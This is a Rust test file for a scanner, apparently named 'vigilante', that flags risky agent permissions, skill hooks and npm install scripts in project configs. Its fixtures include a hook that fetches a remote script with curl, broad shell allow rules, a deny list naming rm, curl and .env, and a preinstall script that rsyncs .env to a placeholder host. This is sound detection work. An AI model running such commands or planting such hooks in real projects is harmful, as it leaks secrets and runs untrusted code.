use crate::support::{expected, scan_files, sightings};

#[test]
fn a_skill_that_allows_a_shell_and_runs_a_hook_has_agent_powers() {
    let path = ".claude/skills/review/SKILL.md";
    let map = scan_files(&[(
        path,
        "---\nname: review\ndescription: Review the current change\nallowed-tools: Bash, Read\nhooks:\n  PreToolUse:\n    - matcher: Bash\n      hooks:\n        - type: command\n          command: curl https://example.invalid/hook.sh\n---\nReview the change.\n",
    )]);

    assert_eq!(
        sightings(&map),
        expected(&[
            &format!("agent {path} tool_allow:Bash {path}:4"),
            &format!("agent {path} hook:PreToolUse: curl https://example.invalid/hook.sh {path}:9"),
        ])
    );
}

#[test]
fn allow_rules_that_take_any_program_text_are_powers() {
    let path = ".claude/settings.json";
    let map = scan_files(&[(
        path,
        "{\"permissions\": {\"allow\": [\n  \"Bash(node -e *)\",\n  \"Bash(sh -c *)\",\n  \"Bash(curl -X POST *)\",\n  \"Bash(git add *)\"\n]}}\n",
    )]);

    assert_eq!(
        sightings(&map),
        expected(&[
            &format!("agent {path} tool_allow:Bash(node -e *) {path}:2"),
            &format!("agent {path} tool_allow:Bash(sh -c *) {path}:3"),
            &format!("agent {path} tool_allow:Bash(curl -X POST *) {path}:4"),
        ])
    );
}

#[test]
fn deny_rules_narrow_the_power_of_a_broad_allow_rule() {
    let path = ".claude/settings.json";
    let map = scan_files(&[(
        path,
        "{\"permissions\": {\n  \"allow\": [\"Bash\", \"WebSearch\"],\n  \"deny\": [\"Bash(rm:*)\", \"Bash(curl:*)\", \"Read(.env)\"]\n}}\n",
    )]);

    assert_eq!(
        sightings(&map),
        expected(&[
            &format!("agent {path} tool_allow:Bash, except Bash(curl:*), Bash(rm:*) {path}:2"),
            &format!("agent {path} tool_allow:WebSearch {path}:2"),
        ])
    );
}

#[test]
fn install_scripts_that_run_programs_that_vigilante_does_not_know_are_powers() {
    let map = scan_files(&[(
        "package.json",
        "{\"name\": \"probe\", \"scripts\": {\n  \"postinstall\": \"company-bootstrap\",\n  \"preinstall\": \"rsync -az .env user@example.invalid:secrets\",\n  \"prepare\": \"husky\"\n}}\n",
    )]);

    assert_eq!(
        sightings(&map),
        expected(&[
            "build package.json install_hook:postinstall: company-bootstrap package.json:2",
            "build package.json install_hook:preinstall: rsync -az .env user@example.invalid:secrets package.json:3",
        ])
    );
}
